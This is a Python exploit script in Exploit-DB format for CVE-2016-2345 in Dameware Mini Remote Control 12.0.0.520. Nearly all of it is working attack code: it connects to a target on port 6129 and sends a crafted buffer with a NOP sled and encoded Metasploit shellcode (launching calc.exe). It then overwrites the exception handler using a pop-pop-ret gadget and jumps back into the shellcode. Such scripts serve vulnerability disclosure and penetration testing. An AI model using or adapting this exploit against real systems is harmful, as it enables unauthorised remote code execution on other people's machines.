# Exploit Title: Dameware Remote Controller RCE
# Date: 3-04-2016
# Exploit Author: Securifera
# Vendor Homepage: http://www.dameware.com/products/mini-remote-control/product-overview.aspx
# Version: 12.0.0.520
# Website: https://www.securifera.com/blog/2016/04/03/fun-with-remote-controllers-dameware-mini-remote-control-cve-2016-2345/
# CVE : CVE-2016-2345

import socket
import sys
import os
import time
import struct
import binascii
import random

# windows/exec - 220 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,
# CMD=calc.exe
sc = ""
sc += "\xba\x01\xa8\x4f\x9e\xd9\xca\xd9\x74\x24\xf4\x5e\x29"
sc += "\xc9\xb1\x31\x31\x56\x13\x03\x56\x13\x83\xee\xfd\x4a"
sc += "\xba\x62\x15\x08\x45\x9b\xe5\x6d\xcf\x7e\xd4\xad\xab"
sc += "\x0b\x46\x1e\xbf\x5e\x6a\xd5\xed\x4a\xf9\x9b\x39\x7c"
sc += "\x4a\x11\x1c\xb3\x4b\x0a\x5c\xd2\xcf\x51\xb1\x34\xee"
sc += "\x99\xc4\x35\x37\xc7\x25\x67\xe0\x83\x98\x98\x85\xde"
sc += "\x20\x12\xd5\xcf\x20\xc7\xad\xee\x01\x56\xa6\xa8\x81"
sc += "\x58\x6b\xc1\x8b\x42\x68\xec\x42\xf8\x5a\x9a\x54\x28"
sc += "\x93\x63\xfa\x15\x1c\x96\x02\x51\x9a\x49\x71\xab\xd9"
sc += "\xf4\x82\x68\xa0\x22\x06\x6b\x02\xa0\xb0\x57\xb3\x65"
sc += "\x26\x13\xbf\xc2\x2c\x7b\xa3\xd5\xe1\xf7\xdf\x5e\x04"
sc += "\xd8\x56\x24\x23\xfc\x33\xfe\x4a\xa5\x99\x51\x72\xb5"
sc += "\x42\x0d\xd6\xbd\x6e\x5a\x6b\x9c\xe4\x9d\xf9\x9a\x4a"
sc += "\x9d\x01\xa5\xfa\xf6\x30\x2e\x95\x81\xcc\xe5\xd2\x7e"
sc += "\x87\xa4\x72\x17\x4e\x3d\xc7\x7a\x71\xeb\x0b\x83\xf2"
sc += "\x1e\xf3\x70\xea\x6a\xf6\x3d\xac\x87\x8a\x2e\x59\xa8"
sc += "\x39\x4e\x48\xcb\xdc\xdc\x10\x22\x7b\x65\xb2\x3a"

port = 6129

if len (sys.argv) == 2:
 (progname, host ) = sys.argv
else:
 print len (sys.argv)
 print 'Usage: {0} host'.format (sys.argv[0])
 exit (1)

csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )

type = 444.0
buf = struct.pack("I", 4400 ) #Init Version
buf += "\xcc"*4
buf += struct.pack("d", type) #Minor Version
buf += struct.pack("d", type) #Minor Version
buf += (40 - len(buf)) * "C"
csock.send(buf)

wstr = "\x90" * 0x10 #nop sled
wstr += sc #calc shellcode
wstr += "\x90" * (0x2ac - 0x10 - len(sc))
wstr += "\xeb\x06\xff\xff" #short jump forward
wstr += struct.pack("I", 0x00401161 ) #pop pop return gadget
wstr += "\x90" * 3 #nop
wstr += "\xe9\x6b\xfa\xff\xff" #short jump back to shellcode
wstr += "E" * 0xbc
wstr += ("%" + "\x00" + "c" + "\x00")*5

buf = struct.pack("I", 0x9c44) #msg type
buf += wstr #payload
buf += "\x00" * (0x200) #null bytes
csock.send(buf)

print binascii.hexlify(csock.recv(0x4000)) #necessary reads
print binascii.hexlify(csock.recv(0x4000))

csock.close()